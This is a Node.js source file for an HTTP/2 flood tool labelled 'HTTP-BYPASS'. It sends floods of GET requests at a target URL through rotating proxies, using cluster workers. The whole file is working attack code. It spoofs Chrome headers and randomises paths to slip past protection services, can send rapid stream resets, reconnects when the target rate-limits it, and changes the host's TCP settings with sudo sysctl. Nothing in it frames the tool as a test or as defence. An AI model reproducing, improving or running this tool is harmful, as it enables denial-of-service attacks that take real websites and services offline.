const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const randstr = require('randomstring');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
const { setsockopt } = require('sockopt');

process.setMaxListeners(0);
process.on('uncaughtException', function (e) { });
process.on('unhandledRejection', function (e) { });

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
const debugMode = process.argv.includes('--debug');
const resetEnabled = process.argv.includes('--reset');
const bypassEnabled = process.argv.includes('--bypass');
const target = process.argv[2];
const time = process.argv[3];
const threads = process.argv[4];
const ratelimit = process.argv[5];
const proxyfile = process.argv[6];
const useRandomSuffix = process.argv[7] === 'rand';

function ra() {
    const rsdat = randstr.generate({
        "charset": "123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM",
        "length": 8
    });
    return rsdat;
}

const mqfi9qjkf3i = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n');
let custom_table = 65535;
let custom_window = 6291455;
let custom_header = 262144;
let custom_update = 15663105;
let headersPerReset = 0;
let SO_SNDBUF = 7;
let SO_RCVBUF = 8;
let TCP_NODELAY = 1;
let SOL_SOCKET = 1;
const url = new URL(target);

function encodeFrame(streamId, type, payload = "", flags = 0) {
    let frame = Buffer.alloc(9);
    frame.writeUInt32BE(payload.length << 8 | type, 0);
    frame.writeUInt8(flags, 4);
    frame.writeUInt32BE(streamId, 5);
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload]);
    return frame;
}

function decodeFrame(data) {
    const lengthAndType = data.readUInt32BE(0);
    const length = lengthAndType >> 8;
    const type = lengthAndType & 0xFF;
    const flags = data.readUint8(4);
    const streamId = data.readUInt32BE(5);
    const offset = flags & 0x20 ? 5 : 0;

    let payload = Buffer.alloc(0);

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length);
        if (payload.length + offset != length) {
            return null;
        }
    }

    return {
        streamId,
        length,
        type,
        flags,
        payload
    };
}

function encodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length);
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6);
        data.writeUInt32BE(settings[i][1], i * 6 + 2);
    }
    return data;
}

const statusCodes = {};
let shouldPrint = false;

function printStatusCodes() {
    if (debugMode && shouldPrint) {
        console.log("(node/bypass) :", statusCodes);
        shouldPrint = false;
        for (const code in statusCodes) {
            statusCodes[code] = 0;
        }
    }
}

setInterval(printStatusCodes, 1000);

function go() {
    var [proxyHost, proxyPort] = "";
    var proxyUser = null, proxyPass = null;
    const selectedProxy = mqfi9qjkf3i[~~(Math.random() * mqfi9qjkf3i.length)];
    const proxyParts = selectedProxy.split(':');
    if (proxyParts.length === 2) {
        [proxyHost, proxyPort] = proxyParts;
    } else if (proxyParts.length === 4) {
        [proxyHost, proxyPort, proxyUser, proxyPass] = proxyParts;
    } else {
        throw new Error('Invalid proxy format');
    }
    let SocketTLS;

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        if (proxyUser && proxyPass) {
            const authHeader = Buffer.from(`${proxyUser}:${proxyPass}`).toString('base64');
            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Authorization: Basic ${authHeader}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        } else {
            netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
        }
        netSocket.once('data', () => {
            setsockopt(netSocket, 6, 3, 1);
            setsockopt(netSocket, 6, TCP_NODELAY, 1);
            setsockopt(netSocket, SOL_SOCKET, SO_SNDBUF, 1000000);
            setsockopt(netSocket, SOL_SOCKET, SO_RCVBUF, 1000000);
            SocketTLS = tls.connect({
                socket: netSocket,
                ALPNProtocols: ['h2', 'http/1.1'],
                servername: url.host,
                ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384',
                sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
                secure: true,
                rejectUnauthorized: false
            }, () => {
                let streamId = 1;
                let data = Buffer.alloc(0);
                let hpack = new HPACK();
                hpack.setTableSize(4096);

                const updateWindow = Buffer.alloc(4);
                updateWindow.writeUInt32BE(custom_update, 0);

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        ...(Math.random() < 0.5 ? [[1, custom_header]] : []),
                        [2, 0],
                        ...(Math.random() < 0.5 ? [[4, custom_window]] : []),
                        ...(Math.random() < 0.5 ? [[6, custom_table]] : []),
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                SocketTLS.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData]);

                    while (data.length >= 9) {
                        const frame = decodeFrame(data);
                        if (frame != null) {
                            data = data.subarray(frame.length + 9);
                            if (frame.type === 1) {
                                const headers = hpack.decode(frame.payload);
                                const statusCodeHeader = headers.find(header => header[0] === ':status');
                                if (statusCodeHeader) {
                                    const statusCode = parseInt(statusCodeHeader[1], 10);
                                    statusCodes[statusCode] = (statusCodes[statusCode] || 0) + 1;
                                    shouldPrint = true;
                                    if (statusCode === 403 || statusCode === 429) {
                                        SocketTLS.end(() => {
                                            SocketTLS.destroy();
                                            go();
                                        });
                                    }
                                }
                            }
                            if (frame.type === 4 && frame.flags === 0) {
                                SocketTLS.write(encodeFrame(0, 4, "", 1));
                            }
                            if (frame.type === 7 || frame.type === 5) {
                                SocketTLS.end(() => SocketTLS.destroy());
                            }
                        } else {
                            break;
                        }
                    }
                });

                SocketTLS.write(Buffer.concat(frames));

                function main() {
                    if (SocketTLS.destroyed) {
                        return;
                    }

                    let generateNumbers = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
                    let version = Math.floor(Math.random() * (134 - 130 + 1) + 130);
                    let ver = Math.floor(Math.random() * 99) + 1;
                    let ver1 = Math.floor(Math.random() * 99) + 1;
                    let ver2 = Math.floor(Math.random() * 99) + 1;
                    const randomPath = bypassEnabled ? `/${ra()}/${ra()}` : url.pathname;
                    const headers = Object.entries({
                        ":method": "GET",
                        ":authority": url.hostname,
                        ":scheme": "https",
                        ":path": `${randomPath}`,
                    }).concat(Object.entries({
                        "sec-ch-ua": `\"Chromium\";v=\"${version}\", \"Not(A:Brand\";v=\"${ver}\", \"Google Chrome\";v=\"${version}\"`,
                        "sec-ch-ua-platform": `"Windows"`,
                        "user-agent": `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${version}.0.${ver1}.${ver2} Safari/537.36`,
                    }));
                    const additionalHeaders = {
                        "accept": [
                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                            "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                            "text/html,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                            "application/json,text/html;q=0.9,image/webp,image/apng,*/*;q=0.8",
                            "application/xhtml+xml,application/xml;q=0.9,text/html;q=0.8,image/webp,*/*;q=0.7",
                            "text/html;q=0.9,image/avif,image/webp,*/*;q=0.8",
                            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                            'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                            'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        ][Math.floor(Math.random() * 6)],
                    
                        "accept-encoding": [
                            "gzip, deflate, br",
                            "gzip, deflate, br, zstd",
                            "gzip, deflate",
                            "gzip, br",
                            "deflate, br, zstd",
                            "br, gzip, deflate"
                        ][Math.floor(Math.random() * 6)],
                    
                        "accept-language": [
                            "en-US,en;q=0.8",
                            "en-US,en;q=0.5",
                            "en-US,en;q=0.9",
                            "en-US,en;q=0.7",
                            "en-US,en;q=0.6",
                            "zh-CN,zh;q=0.8",
                            "zh-CN,zh;q=0.5",
                            "zh-CN,zh;q=0.9",
                            "zh-CN,zh;q=0.7",
                            "zh-CN,zh;q=0.6",
                            "es-ES,es;q=0.8",
                            "es-ES,es;q=0.5",
                            "es-ES,es;q=0.9",
                            "es-ES,es;q=0.7",
                            "es-ES,es;q=0.6",
                            "fr-FR,fr;q=0.8",
                            "fr-FR,fr;q=0.5",
                            "fr-FR,fr;q=0.9",
                            "fr-FR,fr;q=0.7",
                            "fr-FR,fr;q=0.6",
                            "de-DE,de;q=0.8",
                            "de-DE,de;q=0.5",
                            "de-DE,de;q=0.9",
                            "de-DE,de;q=0.7",
                            "de-DE,de;q=0.6",
                            "it-IT,it;q=0.8",
                            "it-IT,it;q=0.5",
                            "it-IT,it;q=0.9",
                            "it-IT,it;q=0.7",
                            "it-IT,it;q=0.6",
                            "ja-JP,ja;q=0.8",
                            "ja-JP,ja;q=0.5",
                            "ja-JP,ja;q=0.9",
                            "ja-JP,ja;q=0.7",
                            "ja-JP,ja;q=0.6",
                            "en-US,en;q=0.8,ru;q=0.6",
                            "en-US,en;q=0.5,ru;q=0.3",
                            "en-US,en;q=0.9,ru;q=0.7",
                            "en-US,en;q=0.7,ru;q=0.5",
                            "en-US,en;q=0.6,ru;q=0.4",
                            "en-US,en;q=0.8,zh-CN;q=0.6",
                            "en-US,en;q=0.8,es-ES;q=0.6",
                            "en-US,en;q=0.8,fr-FR;q=0.6",
                            "en-US,en;q=0.8,de-DE;q=0.6",
                        ][Math.floor(Math.random() * 6)],
                    
                        "cache-control": "max-age=0",
                        "dnt": "1",
                        "priority": "u=0, i",
                        "sec-fetch-dest": "document",
                        "sec-fetch-mode": "navigate",
                        "sec-fetch-site": "none",
                        "sec-fetch-user": "?1",
                        "upgrade-insecure-requests": "1"
                    };

                    Object.entries(additionalHeaders).forEach(([key, value]) => {
                        if (!headers.some(([existingKey]) => existingKey.toLowerCase() === key.toLowerCase())) {
                            headers.push([key, value]);
                        }
                    });

                    const packed = Buffer.concat([
                        Buffer.from([0x80, 0, 0, 0, 0xFF]),
                        hpack.encode(headers)
                    ]);

                    SocketTLS.write(Buffer.concat([encodeFrame(streamId, 1, packed, 0x1 | 0x4 | 0x20)]));
                    if (resetEnabled) {
                        headersPerReset++;
                        if (headersPerReset >= 10) {
                            SocketTLS.write(encodeFrame(streamId, 3, Buffer.from([0x0, 0x0, 0x8, 0x0]), 0));
                            headersPerReset = 0;
                        }
                    }
                    streamId += 2;

                    setTimeout(() => {
                        main();
                    }, 1000 / ratelimit);
                }

                main();
            }).on('error', () => {
                SocketTLS.destroy();
            });
        });

    }).once('error', () => { }).once('close', () => {
        if (SocketTLS) {
            SocketTLS.end(() => {
                SocketTLS.destroy();
                go();
            });
        }
    });
}

function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}

if (cluster.isMaster) {
    console.log(`[INFO] HTTP-BYPASS starting...`);
    console.log(`[INFO] Target: ${target}`);
    console.log(`[INFO] Duration: ${time} seconds`);
    console.log(`[INFO] Threads: ${threads}`);
    console.log(`[INFO] Proxy file: ${proxyfile}`);
    console.log(`[INFO] Debug Mode: ${debugMode ? 'ON' : 'OFF'}`);
    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(1), time * 1000);
} else {
    setInterval(go);
    setTimeout(() => process.exit(1), time * 1000);
}
